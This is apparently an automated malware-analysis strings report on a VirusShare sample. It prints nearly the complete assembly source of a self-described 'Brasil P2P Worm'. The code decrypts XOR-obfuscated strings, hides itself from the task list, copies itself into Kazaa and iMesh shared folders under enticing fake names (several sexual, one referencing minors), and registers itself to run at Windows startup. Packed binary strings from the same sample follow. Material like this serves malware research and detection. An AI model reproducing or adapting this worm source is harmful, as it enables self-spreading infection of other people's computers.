{
    "docinfo": {},
    "filename": "VirusShare_90965785bbf1877439e60ebb453aa7f6",
    "filesize": 20480,
    "filetype": "POSIX tar archive (GNU)",
    "hashes": {
        "md5": "90965785bbf1877439e60ebb453aa7f6",
        "sha1": "0fb47df627ad453da0e9490ddc6850377a92ba5f",
        "sha256": "d78466389489d41811aefeecb3df55dfec50d46edcb8e0f582188b3c4c09306f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "brasil.asm",
            "0100444",
            "0000002",
            "0000002",
            "00000021651",
            "10124054564",
            "0011543",
            "ustar  ",
            "root",
            "root",
            "; -------------------------------------------------------",
            ";                   Brasil P2P Worm",
            "; -------------------------------------------------------",
            ";   http://vx.helith.net/~charvx - cH4R_@tokyo.com",
            "; -------------------------------------------------------",
            ".586",
            ".model flat",
            "; -------------------------------------------------------",
            ";        INCLUDEZ & MACROZ & TYPEZ & DEFINEs",
            "; -------------------------------------------------------",
            "; Hehehe, se vc eh to preguioso quanto eu vai gostar disso...",
            "goapi macro api",
            "extrn api:PROC",
            "call api",
            "endm",
            "ofs equ offset",
            "dwo equ dword ptr",
            "bye equ byte ptr",
            "; \"Mapa\" data estrutura onde recebemos data/hora do sistema",
            "SYSTEMTIME struc",
            "ano           dw ?",
            "mes           dw ?",
            "dia_da_semana dw ?",
            "dia           dw ? ",
            "hora          dw ?",
            "minuto        dw ? ",
            "segundo       dw ?",
            "milesimo      dw ?",
            "SYSTEMTIME ends",
            "; Algumas coisinhas que deveriam vir incluidas nas INCLUDES do Tasm...",
            "HKEY_LOCAL_MACHINE equ 80000002h",
            "HKEY_CURRENT_USER equ 80000001h",
            "KEY_SET_VALUE equ 2h",
            "KEY_QUERY_VALUE equ 1h",
            "REG_SZ equ 1",
            "REG_OPTION_NON_VOLATILE equ 0",
            "REG_OPENED_EXISTING_KEY equ 2h",
            "ERROR_SUCCESS equ 0",
            "; Chave de criptografia das nossas strings",
            "chave equ 14h",
            "; -------------------------------------------------------",
            ";                 DADOS INICIALIZADOS",
            "; -------------------------------------------------------",
            ".DATA",
            "; Ora, toda criao minha precisa de assinatura :P",
            "assinatura db \"[ BraSil ][ cH4R_  presents ]\",0",
            "; Area encriptada",
            "iniciodaarea label byte",
            "; \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"",
            "winstart db \"G{r`cufqHY}wf{g{r`HC}zp{cgHWaffqz`Bqfg}{zHFazH\",chave",
            "; \"KeRnEl32.DlL\"",
            "krn db \"_qFzQx'&:PxX\",chave",
            "; \"RegisterServiceProcess\"",
            "rsp db \"Fqs}g`qfGqfb}wqDf{wqgg\",chave",
            "; \"How_to_rip_dvds.txt.exe\"",
            "nam0 db \"\\{cK`{Kf}dKpbpg:`l`:qlq\",chave",
            "; \"Lolitas_lesbian_sex_video.mpeg.pif\"",
            "nam1 db \"X{x}`ugKxqgv}uzKgqlKb}pq{:ydqs:d}r\",chave",
            "; \"Japanese_school_girls.mpg.scr\"",
            "nam2 db \"^uduzqgqKgw|{{xKs}fxg:yds:gwf\",chave",
            "; \"Yahoo Mail Hacker.exe\"",
            "nam3 db \"Mu|{{4Yu}x4\\uw",
            "qf:qlq\",chave",
            "; \"Anonymous_surfing.exe\"",
            "nam4 db \"Uz{zmy{agKgafr}zs:qlq\",chave",
            "; \"DVD_to_MPEG_encoder.exe\"",
            "nam5 db \"PBPK`{KYDQSKqzw{pqf:qlq\",chave",
            "; \"Britney_Spear_secret_sex_video.avi.pif\"",
            "nam6 db \"Vf}`zqmKGdqufKgqwfq`KgqlKb}pq{:ub}:d}r\",chave",
            "; \"P2P_Speed-UP.exe\"",
            "nam7 db \"D&DKGdqqp9AD:qlq\",chave",
            "; \"Matrix_Emulator.scr\"",
            "nam8 db \"Yu`f}lKQyaxu`{f:gwf\",chave",
            "; \"mIRC_Hack.exe\"",
            "nam9 db \"y]FWK\\uw",
            ":qlq\",chave",
            "; \"SYSTRAY32.EXE\"",
            "sis0 db \"GMG@FUM'&:QLQ\",chave",
            "; \"Systray 32bits\"",
            "str0 db \"Gmg`fum4'&v}`g\",chave",
            "; \"MSGSRV64.EXE\"",
            "sis1 db \"YGSGFB\",22h,\" :QLQ\",chave",
            "; \"Message Server for 64bits System\"",
            "str1 db \"Yqggusq4Gqfbqf4r{f4\",22h,\" v}`g4Gmg`qy\",chave",
            "; \"odbcad64.exe\"",
            "sis2 db \"{pvwup\",22h,\" :qlq\",chave",
            "; \"ODBC 64bits Auto-Save\"",
            "str2 db \"[PVW4\",22h,\" v}`g4Ua`{9Gubq\",chave",
            "; HCU -> \"Software\\Imesh\\Client\\LocalContent\"",
            "Imesh db \"G{r`cufqH]yqg|HWx}qz`HX{wuxW{z`qz`\",chave",
            "; HLM -> \"Software\\Kazaa\\LocalContent\"",
            "Kazaa db \"G{r`cufqH_unuuHX{wuxW{z`qz`\",chave",
            "; \"DownloadDir\"",
            "dldir db \"P{czx{upP}f\",chave",
            "fimdaarea label byte",
            "; Fim da area encriptada",
            "; Slogan do worm :P",
            "slogan db \"| Because BraSil writes with 'S' not 'Z' |\",0",
            "p2pdirs dd 260",
            "; -------------------------------------------------------",
            ";                DADOS NO-INICIALIZADOS",
            "; -------------------------------------------------------",
            ".DATA?",
            "randseed dd ?",
            "apirsp dd ?",
            "hkey dd ?",
            "var dd ?",
            "syst SYSTEMTIME <?>",
            "nois db 260 dup (?)",
            "wormnam db 260 dup (?)",
            "value db 260 dup (?)",
            "windir db 60 dup (?)",
            "p2pdir db 260 dup (?)",
            "valuename db 100 dup (?)",
            "randnam db 100 dup (?)",
            "sisnam db 100 dup (?)",
            "; -------------------------------------------------------",
            ";                     CDIGO DO WORM",
            "; -------------------------------------------------------",
            ".CODE",
            "inicio:",
            "; Decripta todas as strings criptografadas",
            "call EncDec",
            "; Pega o nome do arquivo em que estamos...",
            "push 260",
            "push ofs nois",
            "push 0",
            "goapi GetModuleFileNameA",
            "; Pega o handle da Kernel32.dll",
            "push ofs krn",
            "goapi GetModuleHandleA",
            "; Se no conseguir vai pra proxima fase...",
            "or eax,eax",
            "jz continue",
            "; Se conseguir, pega o endereo de RegisterServiceProcess",
            "push eax",
            "push ofs rsp",
            "goapi GetProcAddress",
            "; Se no der vai pra proxima fase...",
            "or eax,eax",
            "jz continue",
            "mov apirsp,eax",
            "; Se estiver tudo certo, chama a api que esconde o programa do Crtl+Alt+Del",
            "push 1",
            "push 0",
            "call dwo [apirsp]",
            "; Proxima fase...",
            "continue:",
            "; Replica no Kazaa :)",
            "call NomesRnd",
            "call FuckKazaa",
            "; Replica no IMesh :)",
            "call NomesRnd",
            "call FuckIMesh",
            "; Replica no sistema...",
            "; Registra o programa para se iniciar junto com o windows",
            "call autostart",
            "; Payload :D",
            "call Payload",
            "; Checa se anteriormente conseguimos pegar \"RegisterServiceProcess\"",
            "mov eax,apirsp",
            "or eax,eax",
            "jz continue2",
            "; Se sim, nos poe visivel denovo",
            "push 0",
            "push 0",
            "call dwo [apirsp]",
            "; Limpa area...",
            "xor eax,eax",
            "mov apirsp,eax",
            "continue2:",
            "push 0ABCDEFh",
            "goapi ExitProcess",
            "; -------------------------------------------------------",
            ";                        PROCEDURES",
            "; -------------------------------------------------------",
            "; Funo para descriptografar as strings do worm",
            "EncDec proc",
            "mov edi,offset iniciodaarea",
            "proximo:",
            "xor bye [edi],chave",
            "inc edi",
            "cmp edi,offset fimdaarea",
            "jne proximo",
            "EncDec endp",
            "; Funes de escolha randomica do nome do arquivo...",
            "NomesRnd proc",
            "mov randseed,0ABCDEFFFh",
            "; Gera nome pro worm que se copiar no diretrio do programa P2P",
            "call randomize",
            "push 10",
            "call random",
            "jz x0",
            "dec eax ",
            "jz x1",
            "dec eax ",
            "jz x2",
            "dec eax ",
            "jz x3",
            "dec eax ",
            "jz x4",
            "dec eax ",
            "jz x5",
            "dec eax ",
            "jz x6",
            "dec eax ",
            "jz x7",
            "dec eax ",
            "jz x8",
            "push ofs nam0",
            "jmp xx",
            "push ofs nam1",
            "jmp xx",
            "push ofs nam2",
            "jmp xx",
            "push ofs nam3",
            "jmp xx",
            "push ofs nam4",
            "jmp xx",
            "push ofs nam5",
            "jmp xx",
            "push ofs nam6",
            "jmp xx",
            "push ofs nam7",
            "jmp xx",
            "push ofs nam8",
            "jmp xx",
            "push ofs nam9",
            "push ofs randnam",
            "goapi lstrcpy",
            "; Gera nome E Titulo pro worm que se copiar no diretrio do sistema",
            "call randomize",
            "push 2",
            "call random",
            "jz y0",
            "dec eax",
            "jz y1",
            "dec eax",
            "jz y2",
            "push ofs str0",
            "push ofs sis0",
            "jmp ee",
            "push ofs str1",
            "push ofs sis1",
            "jmp ee",
            "push ofs str2",
            "push ofs sis2",
            "pop eax",
            "pop dword ptr [var]",
            "push eax",
            "push ofs sisnam",
            "goapi lstrcpy",
            "push dword ptr [var]",
            "push ofs valuename",
            "goapi lstrcpy",
            "NomesRnd endp",
            "; Funo que infecta o Kazaa",
            "FuckKazaa proc",
            "push ofs hkey",
            "push 0",
            "push 0",
            "push ofs Kazaa",
            "push HKEY_LOCAL_MACHINE",
            "goapi RegOpenKeyExA",
            "cmp eax,ERROR_SUCCESS",
            "jne nemeh",
            "push ofs p2pdirs",
            "push ofs p2pdir",
            "push 0",
            "push 0",
            "push ofs dldir",
            "push dword ptr [hkey]",
            "goapi RegQueryValueExA",
            "push ofs p2pdir",
            "goapi lstrlen",
            "add eax,ofs p2pdir",
            "mov byte ptr [eax],05Ch",
            "push ofs p2pdir",
            "push ofs wormnam",
            "goapi lstrcpy",
            "push ofs randnam",
            "push ofs wormnam",
            "goapi lstrcat",
            "push 0",
            "push ofs wormnam",
            "push ofs nois",
            "goapi CopyFileA",
            "nemeh:",
            "push hkey",
            "goapi RegCloseKey",
            "FuckKazaa endp",
            "; Funo para infectar o IMesh",
            "FuckIMesh proc",
            "push ofs hkey",
            "push 0",
            "push 0",
            "push ofs Kazaa",
            "push HKEY_LOCAL_MACHINE",
            "goapi RegOpenKeyExA",
            "cmp eax,ERROR_SUCCESS",
            "jne caifora",
            "push ofs p2pdirs",
            "push ofs p2pdir",
            "push 0",
            "push 0",
            "push ofs dldir",
            "push dword ptr [hkey]",
            "goapi RegQueryValueExA",
            "push ofs p2pdir",
            "goapi lstrlen",
            "add eax,ofs p2pdir",
            "mov byte ptr [eax],05Ch",
            "push ofs p2pdir",
            "push ofs wormnam",
            "goapi lstrcpy",
            "push ofs randnam",
            "push ofs wormnam",
            "goapi lstrcat",
            "push 0",
            "push ofs wormnam",
            "push ofs nois",
            "goapi CopyFileA",
            "caifora:",
            "push hkey",
            "goapi RegCloseKey",
            "FuckIMesh endp",
            "; Funo para colocar o worm no Auto-Start",
            "autostart proc",
            "push 60",
            "push ofs windir",
            "goapi GetWindowsDirectoryA",
            "push ofs hkey",
            "push ofs winstart",
            "push HKEY_LOCAL_MACHINE",
            "goapi RegCreateKeyA",
            "push ofs windir",
            "push ofs value",
            "goapi lstrcpy",
            "push ofs value",
            "goapi lstrlen",
            "add eax,ofs value",
            "mov byte ptr [eax],05Ch",
            "push ofs sisnam",
            "push ofs value",
            "goapi lstrcat",
            "push ofs value",
            "goapi lstrlen",
            "push eax",
            "push ofs value",
            "push REG_SZ",
            "push 0",
            "push ofs valuename",
            "push hkey",
            "goapi RegSetValueExA",
            "push hkey",
            "goapi RegCloseKey",
            "push 0",
            "push ofs value",
            "push ofs nois",
            "goapi CopyFileA",
            "autostart endp",
            "; Funes para gerao randomica de nmeros",
            "random proc ",
            "mov eax,randseed",
            "imul eax,214013",
            "add eax,2531011",
            "mov randseed,eax",
            "shr eax,16",
            "imul eax,[esp+4]",
            "shr eax,16",
            "ret 4",
            "random endp",
            "randomize proc",
            "pusha",
            "goapi GetTickCount",
            "xor randseed,eax",
            "popa",
            "randomize endp",
            "; Checa data e se for mostra mensagem. (Payload)",
            "Payload proc",
            "push offset syst",
            "goapi GetSystemTime",
            "mov ax,[syst.mes]",
            "mov bx,[syst.dia]",
            "cmp ax,09",
            "jne ehnao",
            "cmp bx,07",
            "jne ehnao",
            "push 0",
            "push ofs slogan",
            "push ofs assinatura",
            "push 0",
            "goapi MessageBoxA",
            "ehnao:",
            "Payload endp",
            "; -------------------------------------------------------",
            ";                     FIM DO CDIGO",
            "; -------------------------------------------------------",
            "end inicio",
            "brasil.exe",
            "0100444",
            "0000002",
            "0000002",
            "00000003575",
            "10124054564",
            "0011551",
            "ustar  ",
            "root",
            "root",
            "FSG!",
            "%@e@",
            "su:S",
            "V+^^PS",
            "KERNEL32.dll",
            "M z`c",
            "P/JF",
            "^c13ABh\u036bH",
            "tWHM ",
            "C@9/%",
            "/\u028f(G!#",
            "hv#;P/",
            "\\P.HJ",
            "h&!:X6d",
            "P_L-%\"m",
            "t#/E",
            "Lh\"L\u02ba~!",
            "Dr>#U",
            "Bj<h|BOj",
            "x$&F",
            "|l!,\u0549PT",
            "3u\u0645,",
            "j1H\u0181#&",
            "w@iCo",
            "i%fEb\u060b",
            "=\tAJ",
            "`a@h%U0\u0664R",
            "C!d2",
            "\u0506C!\u0710",
            "U`[ Br",
            "aSil]",
            "H4R_>presntp&>G{",
            "`cufqHY;}w|og",
            "OCGzpc",
            "Waf{0:`Bw}x{F",
            "Qx'&:PXs}g`>G",
            "b|[D8",
            "\\zK`}dpbg|:~lq",
            "ugKlJvz*pp{:ydur",
            "=^uo2a8w|{^f_?o<\"C",
            "+4Y}x\\fw",
            "WUzmya\u0732Prs",
            "PBHY",
            "DQS(zwSp.(Va`mKG}S`u",
            "Dr&#p9AV8l`tLQ",
            "{\ue6d0]FWRKD\"GrM",
            "@FUd",
            "mgbu4",
            "x~GSF",
            "}&:us48M",
            "r4'=6q(y",
            "wtu\\X",
            "[PVWa Ua9G5,]dy|",
            "[}cpu",
            "#u_wnZ",
            "$P<Ha|L|!?e(a2)w_t",
            "S^Ono",
            "\t\u0411\">",
            "1W(\u01580{",
            "/\tDEYk",
            "w$H\"D",
            "KERNL~3",
            ".dlx",
            "ADVePI1",
            "WinCowsDrc\uf7a5yA3",
            "MdulFai",
            "7Hahj",
            "Procd\u3700sh",
            "~C4pyn&",
            "={T1ck&un",
            "ExP/+l~{ta",
            "!zR6gC^KD0",
            "0SValyu",
            "~g4Bo",
            "LoadLibraryA",
            "GetProcAddress"
        ],
        "file": {
            "; Pega o handle da Kernel32.dll": "Library",
            "KERNEL32.dll": "Library",
            "brasil.exe": "Executable"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://vx.helith.net/~charvx"
        ]
    },
    "time": "0:00:00.268930",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
